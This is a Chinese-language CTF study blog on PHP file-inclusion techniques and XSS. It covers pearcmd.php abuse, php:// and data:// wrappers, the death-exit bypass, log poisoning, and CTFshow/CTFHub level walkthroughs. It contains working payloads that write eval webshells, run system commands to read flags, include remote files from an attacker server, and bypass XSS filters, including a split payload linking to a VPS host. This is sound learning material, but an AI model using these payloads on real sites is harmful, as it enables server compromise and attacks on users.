这个配置项用于定义存储上传进度信息的 Session 变量的名称。在使用上传进度跟踪功能时，PHP 将会在 Session 中创建一个特殊的变量来存储上传的文件的进度信息，并且此变量的名称可以由 session.upload_progress.name 来定义。
name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控
前置知识Linux和Nginx默认session文件存放路径：
/var/lib/php/sess_PHPSESSID（第二通常的）/var/lib/php/sessions/sess_PHPSESSID/tmp/sess_PHPSESSID（最最通常的）/tmp/sessions/sess_PHPSESSID

session_start()简介
读取名为PHPSESSID（如果没有改变默认值）的cookie值，假使为abc123。
（2）若读取到PHPSESSID这个COOKIE，创建SESSION变量，并从相应的目录中（可以在php.ini中设置）读取SESSabc123（默认是这种命名方式）文件，将字符装在入SESSION变量中；
（3）若没有读取到PHPSESSID这个COOKIE，也会创建SESSION超全局变量注册session变量。同时创建一个sess_abc321(名称为随机值)的session文件，同时将abc321作为PHPSESSID的cookie值返回给浏览器端。
pearcmd.php漏洞1.概念pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl&#x2F;pear是默认安装的；
在7.4及以后，需要我们在编译PHP的时候指定–with-pear才会安装。
不过，在Docker任意版本镜像中，pcel&#x2F;pear都会被默认安装，安装的路径在&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php。
要利用这个pearcmd.php需要满足几个条件：
（1）要开启register_argc_argv这个选项在Docker中使自动开启的
（2）要有文件包含的利用
2.如何利用看到config-create，去阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。
所以最后构造出payload
例子1：/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php
上面是将写到&#x2F;tmp&#x2F;hello.php,然后我们再使用文件包含进行包含我们之前写入的文件（hello.php）就可以了。
例子2：payload:/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[1])?&gt;+/tmp/hello.php
3.注意用burpsuite传GET，用hackbar会被url编码，传入文件无法解析
4.实战详见另一篇文章《解题心得》

借鉴的文章：https://blog.csdn.net/JCPS_Y/article/details/127541665
php伪协议php支持的伪协议
1 file:&#x2F;&#x2F; — 访问本地文件系统2 http:&#x2F;&#x2F; — 访问 HTTP(s) 网址3 ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs4 php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）5 zlib:&#x2F;&#x2F; — 压缩流6 data:&#x2F;&#x2F; — 数据（RFC 2397）7 glob:&#x2F;&#x2F; — 查找匹配的文件路径模式8 phar:&#x2F;&#x2F; — PHP 归档9 ssh2:&#x2F;&#x2F; — Secure Shell 210 rar:&#x2F;&#x2F; — RAR11 ogg:&#x2F;&#x2F; — 音频流12 expect:&#x2F;&#x2F; — 处理交互式的流
php:&#x2F;&#x2F;filter基础php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。
简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。
php:&#x2F;&#x2F;filter可以获取指定文件源码。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。
协议参数：



名称
描述



resource&#x3D;&lt;要过滤的数据流&gt;
这个参数是必须的。它指定了你要筛选过滤的数据流。


read&#x3D;&lt;读链的筛选列表&gt;
该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;


write&#x3D;&lt;写链的筛选列表&gt;
该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;


&lt;；两个链的筛选列表&gt;
任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。


常用：
php://filter/read=convert.base64-encode/resource=index.phpphp://filter/resource=index.php

利用filter协议读文件±，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。
而使用的convert.base64-encode，就是一种过滤器。
利用filter伪协议绕过死亡exit什么是死亡exit死亡exit指的是在进行写入PHP文件操作时，执行了以下函数：
file_put_contents($content, &#x27;&lt;?php exit();&#x27; . $content);亦或者file_put_contents($content, &#x27;&lt;?php exit();?&gt;&#x27; . $content);

这样，当你插入一句话木马时，文件的内容是这样子的：
&lt;?php exit();?&gt;&lt;?php @eval($_POST[&#x27;snakin&#x27;]);?&gt;

这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡exit通常存在于缓存、配置文件等等不允许用户直接访问的文件当中。
（1）base64decode绕过利用filter协议来绕过，看下这样的代码：
&lt;?php$content = &#x27;&lt;?php exit; ?&gt;&#x27;;$content .= $_POST[&#x27;txt&#x27;];file_put_contents($_POST[&#x27;filename&#x27;], $content);

当用户通过POST方式提交一个数据时，会与死亡exit进行拼接，从而避免提交的数据被执行。
然而这里可以利用php:&#x2F;&#x2F;filter的base64-decode方法，将$content解码，利用php base64_decode函数特性去除死亡exit。
base64编码中只包含64个可打印字符，当PHP遇到不可解码的字符时，会选择性的跳过，这个时候base64就相当于以下的过程：
&lt;?php$_GET[&#x27;txt&#x27;] = preg_replace(&#x27;|[^a-z0-9A-Z+/]|s&#x27;, &#x27;&#x27;, $_GET[&#x27;txt&#x27;]);base64_decode($_GET[&#x27;txt&#x27;]);

所以，当$content 包含 &lt;?php exit; ?&gt;时，解码过程会先去除识别不了的字符，&lt; ; ? &gt;和空格等都将被去除，于是剩下的字符就只有phpexit以及我们传入的字符了。由于base64是4个byte一组，再添加一个字符例如添加字符’a’后，将’phpexita’当做两组base64进行解码，也就绕过这个死亡exit了。
这个时候后面再加上编码后的一句话木马，就可以getshell了。
（2）strip_tags绕过这个&lt;?php exit; ?&gt;实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php:&#x2F;&#x2F;filter刚好是支持这个方法的。
但是我们要写入的一句话木马也是XML标签，在用到strip_tags时也会被去除。
注意到在写入文件的时候，filter是支持多个过滤器的。可以先将webshell经过base64编码，strip_tags去除死亡exit之后，再通过base64-decode复原。
过滤器字符串过滤器该类通常以string开头，对每个字符都进行同样方式的处理。
string.rot13
一种字符处理方式，字符右移十三位
 str_rot13（自 PHP 4.3.0 起等同于用 str_rot13()函数处理所有的流数据）—对字符串执行ROT13转换. ROT13 是一种简单的替换密码，将字母表中的每个字母向后移动13个位置,同时忽略非字母表中的字符。这意味着对一个字符进行 ROT13 编码两次会得到原始字符。
$string = &quot;Hello, World!&quot;;$encoded = str_rot13($string);$decoded = str_rot13($encoded);echo $encoded; // 输出 &quot;Uryyb, Jbeyq!&quot;echo $decoded; // 输出 &quot;Hello, World!&quot;

string.toupper
 string.toupper（自 PHP 5.0.0 起等同于用 strtoupper()函数处理所有的流数据）使用此过滤器,将字符串转化为大写
string.tolower
 string.tolower（自 PHP 5.0.0 起等同于用 strtolower()函数处理所有的流数据）使用此过滤器,将字符串转化为小写
 string.strip_tags(自 PHP 7.3.0 起废弃)​ string.strip_tags使用此过滤器等同于用 strip_tags()函数处理所有的流数据。可以用两种格式接收参数：一种是和strip_tags()函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。从字符串中去除 HTML 和 PHP 标记.该函数尝试返回给定的字符串str去除空字符、HTML 和 PHP 标记后的结果。与strip_tags()函数该过滤器会完全去除所有的 HTML 和 PHP 标签**，无法通过参数来指定允许保留的标签。
$html = &quot;&lt;p&gt;Hello, &lt;b&gt;World!&lt;/b&gt;&lt;/p&gt;&quot;;$filtered = file_get_contents(&#x27;php://filter/string.strip_tags/resource=data:text/plain,&#x27; . urlencode($html));#进行编码防止乱码出现echo $filtered; // 输出 &quot;Hello, World!&quot;

转换过滤器（1）对数据流进行编码，通常用来读取文件源码。
convert.base64-encode &amp; convert.base64-decode
（2）base64加密解密
convert.quoted-printable-encode &amp; convert.quoted-printable-decode
可以翻译为可打印字符引用编码，使用可以打印的ASCII编码的字符表示各种编码形式下的字符。
压缩过滤器虽然 压缩封装协议 提供了在本地文件系统中 创建 gzip 和 bz2 兼容文件的方法，但不代表可以在网络的流中提供通用压缩的意思，也不代表可以将一个非压缩的流转换成一个压缩流。对此，压缩过滤器可以在任何时候应用于任何流资源。
 zlib.deflate（压缩）和 zlib.inflate（解压）实现了定义与 » RFC 1951 的压缩算法。 deflate 过滤器可以接受以一个关联数组传递的最多三个参数。 level定义了压缩强度（1-9）。 数字更高通常会产生更小的载荷，但要消耗更多的处理时间。 存在两个特殊压缩等级：0（完全不压缩）和 -1（zlib 内部默认值，目前是 6）。 window是压缩回溯窗口大小，以二的次方表示。 更高的值（大到 15 —— 32768 字节）产生更好的压缩效果但消耗更多内存， 低的值（低到 9 —— 512 字节）产生产生较差的压缩效果但内存消耗低。 目前默认的 window 大小是 **15**。 memory用来指示要分配多少工作内存。 合法的数值范围是从 1（最小分配）到 9（最大分配）。 内存分配仅影响速度，不会影响生成的载荷的大小。
Note: 压缩过滤器 不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。 zlib.* 压缩过滤器自 PHP 版本 5.1.0起可用，在激活 zlib的前提下。也可以通过安装来自 » PECL的 » zlib_filter包作为一个后门在 5.0.x版中使用。此过滤器在 PHP 4 中 不可用。?file=compress.zlib://flag.php

加密过滤器mcrypt.*和 mdecrypt.*使用 libmcrypt 提供了对称的加密和解密。
更多妙用：https://www.leavesongs.com/PENETRATION/php-filter-magic.html
data:&#x2F;&#x2F;（与包含函数结合）数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。
1、data://text/plain,http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt; 2、data://text/plain;base64,经过base64编码再经过url编码的数据http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b


知识点补充：base64编码
Base64 不是加密算法，而是一种编码方式，常用于将二进制数据转换为文本数据。Base64 编码通过将数据转换为一种由 64 个不同字符组成的 ASCII 字符串来表示二进制数据。
在 PHP 中，你可以使用 base64_encode() 函数来对数据进行 Base64 编码，以及使用 base64_decode() 函数将 Base64 编码的数据解码为原始数据。

例子一：打印 data:&#x2F;&#x2F; 的内容
&lt;?php// 打印 &quot;I love PHP&quot;echo  file_get_contents ( &#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27; );?&gt;

对该代码的解释：这段 PHP 代码使用了 file_get_contents 函数来读取指定 URI 的内容并将其输出。
具体来说，file_get_contents 函数用于从文件中读取内容。在这个例子中，它读取的是一个 Data URI，这是一种在 URL 中嵌入数据的方式。Data URI 是一种将小文件直接嵌入到文档中的方案，通常用于将图片、音频、文本等文件编码为字符串，这样就可以直接在 URL 中传输。
在这里，data:&#x2F;&#x2F; 前缀表示将从数据流中读取内容，text&#x2F;plain;base64 指定了数据的 MIME 类型（这里是文本类型，并且内容是经过 Base64 编码的），后面的 Base64 编码字符串 SSBsb3ZlIFBIUAo&#x3D; 实际上是文本字符串 “I love PHP” 的 Base64 编码。
所以，file_get_contents(‘data:&#x2F;&#x2F;text&#x2F;plain;base64,SSBsb3ZlIFBIUAo&#x3D;’) 读取了这个 Base64 编码字符串，并将其解码为 “I love PHP”，最后通过 echo 命令输出到页面上。
例子二：获取媒体类型
&lt;?php$fp    =  fopen ( &#x27;data://text/plain;base64,&#x27; ,  &#x27;r&#x27; );$meta  =  stream_get_meta_data ( $fp );// 打印 &quot;text/plain&quot;echo  $meta [ &#x27;mediatype&#x27; ];?&gt;

解释：这段 PHP 代码使用了 fopen 函数以只读模式打开一个 Data URI 的资源，然后使用 stream_get_meta_data 函数获取有关资源的元数据。
具体来说，fopen 函数打开了一个指向 Data URI 的文件句柄 $fp，但是在这个例子中，Data URI 的内容部分是空的。这个 Data URI 是 text/plain 类型的数据流，但是没有提供实际的数据内容。所以实际上没有内容可读，只是打开了这个数据流。
然后，stream_get_meta_data 函数用于获取与 $fp 文件句柄相关的元数据。在这里，$meta 变量接收了这些元数据。其中，$meta[&#39;mediatype&#39;] 表示这个数据流的媒体类型。由于在打开时未提供具体的 Base64 编码数据，所以无法读取实际的内容，但能够得到的是媒体类型的信息。
3.file:&#x2F;&#x2F;用于访问本地文件系统，若不加协议名称，默认为file://协议；并且不受allow_url_fopen，allow_url_include影响file:&#x2F;&#x2F;协议主要用于访问文件(绝对路径、相对路径以及网络路径)
#Linuxcmd=file:///path/to/flag    #根目录下path文件夹中to文件夹下flag文件 ——此处有///三条cmd=file://relative/path/flag    #当前目录下relative文件夹中path文件夹下flag文件cmd=file://flag    #当前目录下的flag文件#Windows    cmd=file://C:/path/to/flag.txt #C盘中path文件夹中to文件夹下flag文件cmd=file://C:flag.txt  #C盘下flag文件cmd=file://flag.txt  #当前文件夹下flag文件

注意：当不说明使用file:&#x2F;&#x2F;协议时（即默认file:&#x2F;&#x2F;协议的情况）可以使用相对路径，当使用了file协议时无法使用相对路径
4.php:&#x2F;&#x2F;在allow_url_fopen，allow_url_include(:仅php://input 、php://stdin、php://memory、php://temp 需要on)都关闭的情况下可以正常使用php:&#x2F;&#x2F;作用为访问输入输出流
5.php:&#x2F;&#x2F;inputphp:&#x2F;&#x2F;input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。
例如：
http://127.0.0.1/cmd.php?cmd=php://inputPOST数据：&lt;?php phpinfo()?&gt;

注意：当enctype=&quot;multipart/form-data&quot;的时候 php://input是无效的
遇到file_get_contents()要想到用php://input绕过。
6.zip:&#x2F;&#x2F;zip:&#x2F;&#x2F; 可以访问压缩包里面的文件。当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行。从而实现任意代码执行。

7.http:&#x2F;&#x2F;访问 HTTP(s) 网址
条件：

allow_url_fopen:on
allow_url_include:on

作用：常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。
使用示例：以传参变量名为cmd演示
PHPcmd=http://example.com/phpinfo.txt	#读取http://example.com/phpinfo.txt文件cmd=https://example.com/file.php?var1=val1&amp;var2=val2	#读取https://example.com/file.php文件并且传入var1和var2的值

CTFshowweb78&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;

一道经典的文件包含题目
首先我们get传参：?file=/../../../../../etc/passwd，回显说明可以文件包含（当然这题可以直接跳过这个步骤）
然后就是利用php伪协议来获取所需的文件：?file=php://filter/convert.base64-encode/resource=flag.php
web79&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;

根据代码所示出现php会被问号代替
由于有include函数，所以联想到伪协议data://，然后利用短标签来写php代码
首先查看当前目录下的文件：?file=data://text/plain,&lt;?=system(&#39;ls&#39;);?&gt;，目录下有个Flag文件
接着打印出该文件（用base64编码一下）：?file=data://text/plain,&lt;?=system(&#39;cat flag*|base64&#39;);?&gt;
拿去解码，得到所要的flag
web80&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;

用日志包含来绕过
首先用bp抓包，尝试访问：/../../../../etc/passwd，部分回显如下图所示：
从中可以知道用的是nginx，而nginx默认日志路径 /var/log/nginx/access.log
所以我们尝试访问：?file=/var/log/nginx/access.log，成功
然后在UA头处输入代码：&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;（记住要是单引号，双引号会被转义掉）
然后用蚁剑连接上，题目解决
第二种方法：可以大小写绕过：?file=PHP://input
web81&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;

按照上题的日志包含解决题目
CTFHubRCE-文件包含&lt;?phperror_reporting(0);if (isset($_GET[&#x27;file&#x27;])) &#123;    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) &#123;        include $_GET[&quot;file&quot;];    &#125; else &#123;        echo &quot;Hacker!!!&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;&lt;hr&gt;i have a &lt;a href=&quot;shell.txt&quot;&gt;shell&lt;/a&gt;, how to use it ?

利用题目提供的shell.txt来进行绕过：?file=shell.txt
根据该文件里面的内容，post传参：ctfhub=system(&#39;cat /flag&#39;);
题目解决
php:&#x2F;&#x2F;input&lt;?phpif (isset($_GET[&#x27;file&#x27;])) &#123;    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) &#123;        include($_GET[&quot;file&quot;]);    &#125; else &#123;        echo &quot;Hacker!!!&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;&lt;hr&gt;i don&#x27;t have shell, how to get flag? &lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;

通过查看题目给的phpinfo，有如下发现：
这说明了可以使用php:&#x2F;&#x2F;input
第一种方法，使用php://input，如下：

得到所需文件地址，打印出来，题目解决

远程包含&lt;?phperror_reporting(0);if (isset($_GET[&#x27;file&#x27;])) &#123;    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) &#123;        include $_GET[&quot;file&quot;];    &#125; else &#123;        echo &quot;Hacker!!!&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;&lt;hr&gt;i don&#x27;t have shell, how to get flag?&lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;

 if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;))发现题目要求必须使用非含flag的文件进行包含，则此时可以考虑进行远程包含。在服务器上建立一个txt文件（不能是php文件哟），如下：
&lt;?php   system(&#x27;ls /&#x27;);?&gt;

得到根目录上面的文件列表，然后打印出我们所需的文件
&lt;?php   system(&#x27;cat /flag&#x27;);?&gt;

得到flag，题目解决
读取源代码&lt;?phperror_reporting(E_ALL);if (isset($_GET[&#x27;file&#x27;])) &#123;    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) &#123;        include($_GET[&quot;file&quot;]);    &#125; else &#123;        echo &quot;Hacker!!!&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;&lt;hr&gt;i don&#x27;t have shell, how to get flag? &lt;br&gt;flag in &lt;code&gt;/flag&lt;/code&gt;

使用php伪协议中的 php://filter来读取flag文件，题目解决
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>xss学习</title>
    <url>/2024/02/10/xss%E5%AD%A6%E4%B9%A0_max/xss%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[基础简介网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web应用程序能够输出相应的内容。动态站点会受到一种名为“跨站脚本攻击”的威胁，而静态站点则完全不受其影响。恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的
xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数
分类反射型XSS：&lt;非持久化&gt;
 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。DOM型XSS由于危害较小，我们将其归为反射型XSS
存储型XSS：&lt;持久化&gt;
代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie(虽然还有种DOM型XSS，但是也还是包括在存储型XSS内)
dom型与反射型的区别：
在dom型中输入的内容并不会出现在响应体里面（源码里面也不会）
响应体是我的输入会经过后端，经过后端渲染后再返回到前端；dom型是直接通过前端的js代码把我的输入插入到页面中进行实时渲染，这个时候并不是后端反应给我的，dom型没有向后端发起任何请求，而按F12可以看到输入的内容插入到源码中是因为其返回的是实时渲染的结果
补充js伪协议：就是把javascript: :后面的代码当JavaScript来执行

使用htmlspecialchars函数把预定义的字符&amp;、”、 ’、&lt;、&gt;转换为HTML实体，防止浏览器将其作为HTML元素
但是默认是只编码双引号的，而且单引号无论如何都不转义。
预定义的字符是：
- &amp; （和号）成为 &amp;amp;- &quot; （双引号）成为 &amp;quot;- &#x27; （单引号）成为 &#x27;- &lt; （小于）成为 &amp;lt;- &gt; （大于）成为 &amp;gt;

CRLF注入漏洞这也就牵扯到CRLF漏洞了
在 HTTP 协议中，CRLF 被用来分隔 HTTP 请求和响应中的各个部分。
CRLF 是回车符（carriage return，CR）和换行符（line feed，LF）的缩写，它们通常被一起使用来表示一行的结束。CRLF 漏洞（也称为 HTTP 报头注入漏洞）是一种 Web 应用程序安全漏洞，攻击者可以利用这个漏洞向 HTTP 响应中注入任意的 HTTP 头或者响应体，一般攻击者可以通过在输入中注入 CRLF 字符来改变 HTTP 响应的内容，从而实现恶意操作。
比如有一个搜索关键词的网站利用GET的形式传参
exp:?key=aaa

如果该网站存在CRLF漏洞，那么我们就可以利用回车符&#x2F;换行符进行绕过过滤
?key=%0d%0a%0d%0a&lt;img src=1 onerror=alert(1)&gt;

我们抓一下包看一下返回包
HTTP/1.1 200 OKDate:xxxxxxxxxxContent-type:text/htmlContet-Length:xxxConnection:closeLocation:&lt;img src=1 onerror=alert(/xss/)&gt;

浏览器会根据第一个CRLF把HTTP包分成header和body，然后将体显示出来。于是我们这里这个标签就会显示出来，造成一个XSS
浏览器的Filter是浏览器应对一些反射型XSS做的保护策略，当url中含有XSS相关特征的时候就会过滤掉不显示在页面中，所以不能触发XSS。
怎样才能关掉filter？一般来说用户这边是不行的，只有数据包中http头含有X-XSS-Protection并且值为0的时候，浏览器才不会开启filter。
我们可以将X-XSS-Protection:0注入到数据包中，再用两个CRLF来注入XSS代码，这样就成功地绕过了浏览器filter，并且执行我们的反射型XSS
绕过姿势拼接绕过eval
&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;al&#x27;+&#x27;ert(Evi1s7)&#x27;)&quot;&gt;

top
&lt;img src=&quot;x&quot; onerror=&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](Evi1s7)&quot;&gt;

window
&lt;img src=&quot;x&quot; onerror=&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;

self
&lt;img src=&quot;x&quot; onerror=&quot;self[`al`+`ert`](1)&quot;&gt;

parent
&lt;img src=&quot;x&quot; onerror=&quot;parent[`al`+`ert`](1)&quot;&gt;

frames
&lt;img src=&quot;x&quot; onerror=&quot;frames[`al`+`ert`](1)&quot;&gt;

函数替换&lt;img src=&quot;x&quot; onerror=&quot;eval(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;open(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;document.write(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;setTimeout(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;setInterval(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;Set.constructor(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;Map.constructor(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;Array.constructor(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;WeakSet.constructor(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;constructor.constructor(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;[1].map(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;[1].find(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;[1].every(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;[1].filter(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;[1].forEach(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;[1].findIndex(alert(1))&quot;&gt;

以上只是利用&lt;img&gt;标签进行举例，也可以在别的标签中使用
嵌套绕过&lt;sc&lt;script&gt;ript&gt;alert(&#x27;Evi1s7&#x27;)&lt;/sc&lt;/script&gt;ript&gt;

在这一段代码中，由于标签名被拆分成两部分，浏览器会将第一个尖括号视为标签名的起始符号，而第二个尖括号则是&lt;script&gt; 标签的起始符号，导致浏览器误以为有两个标签被嵌套在一起，从而实现我们的XSS攻击
url编码绕过需要注入点存在href属性或者src属性，才可以利用url编码转义
（注意在url解析过程中，不能对协议类型进行任何的编码操作）
&lt;a href=javascript:alert(1)&gt;Evi1s7&lt;/a&gt;#&lt;a href=javascript:%61%6c%65%72%74%28%31%29&gt;Evi1s7&lt;/a&gt;

scr和href属性1.src属性总的来说，src属性通常用于指定外部资源的URL，让浏览器从指定的URL中获取资源并加载它们。
&lt;script&gt;标签
src属性用于指定引入外部JavaScript文件的URL
&lt;img&gt;标签
src属性用于指定要显示的图像的URL
&lt;iframe&gt;标签
src属性用于指定要嵌入的另一个文档的URL。
&lt;audio&gt;和&lt;video&gt;标签
src属性用于指定要播放的音频或视频的URL
&lt;audio controls&gt;  &lt;source src=&quot;path/to/your/audio.mp3&quot; type=&quot;audio/mp3&quot;&gt;&lt;/audio&gt;&lt;video controls&gt;  &lt;source src=&quot;path/to/your/video.mp4&quot; type=&quot;video/mp4&quot;&gt;&lt;/video&gt;

2.href属性总的来说，href属性通常用于指定链接目标的URL或外部资源的URL，以及用于指定基准URL或图像地图中区域的URL。
&lt;a&gt;标签
href属性用于指定链接目标的URL。
&lt;link&gt;标签
href属性用于指定外部样式表的URL。
&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;path/to/your/stylesheet.css&quot;&gt;

&lt;base&gt;标签
href属性用于指定基准URL，所有相对URL都将以该URL为基础。
&lt;base href=&quot;https://www.example.com/&quot;&gt;&lt;a href=&quot;path/to/your/page.html&quot;&gt;Link Text&lt;/a&gt;

&lt;area&gt;标签
href属性用于指定图像地图中区域的URL。
&lt;img src=&quot;path/to/your/image.jpg&quot; alt=&quot;Your Image&quot; usemap=&quot;#your-map&quot;&gt;&lt;map name=&quot;your-map&quot;&gt;  &lt;area shape=&quot;rect&quot; coords=&quot;0,0,100,100&quot; href=&quot;path/to/your/page.html&quot;&gt;&lt;/map&gt;

()绕过1.利用反引号
&lt;script&gt;alert`1`&lt;/script&gt;

2.throw绕过
&lt;script&gt;alert;throw 1&lt;/script&gt;&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;

单引号过滤1.可以利用斜杠替换
&lt;script&gt;alert(/Evi1s7/)&lt;/script&gt;

2.利用反引号替换
&lt;script&gt;alert(`Evi1s7`)&lt;/script&gt;

长度限制可以利用拆分法
&lt;script&gt;a=&#x27;document.write(&quot;&#x27;&lt;/script&gt;&lt;script&gt;a=a+&#x27;&lt;a href=ht&#x27;&lt;/script&gt;&lt;script&gt;a=a+&#x27;tp://VPS-IP:po&#x27;&lt;/script&gt;&lt;script&gt;a=a+&#x27;rt&gt;Evi1s7&lt;/a&gt;&quot;)&#x27;&lt;/script&gt;&lt;script&gt;eval(a)&lt;/script&gt;

利用eval()函数将字符串解析为可执行的代码，从而进行拼接
document.write(&quot;&lt;a href=http://VPS-IP:port&gt;Evi1s7&lt;/a&gt;&quot;)

分号绕过当只过滤了分号时，可以利用花括号进行语句隔离
&lt;script&gt;&#123;onerror=alert&#125;throw 1&lt;/script&gt;

xss挑战之旅靶场：http://test.ctf8.com/
level-1&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;name&quot;];echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;?&gt;

没有任何过滤，直接：/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;，弹出弹窗，进入下一关
level-2$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.$str.&#x27;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;

$str被双引号包含，所以我们需要先包含双引号后再xss：&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;，或者 &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot; 弹出弹窗，进入下一关
